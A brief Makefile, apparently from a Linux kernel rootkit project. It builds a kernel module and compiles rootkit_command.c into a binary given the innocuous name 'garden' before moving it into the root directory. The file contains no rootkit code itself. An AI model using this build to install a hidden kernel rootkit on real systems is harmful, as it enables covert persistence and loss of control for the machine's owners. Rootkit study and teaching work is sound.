KDIR = /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$$PWD
	gcc rootkit_command.c -o garden
	mv garden /
clean:
	make -C $(KDIR) M=$$PWD clean
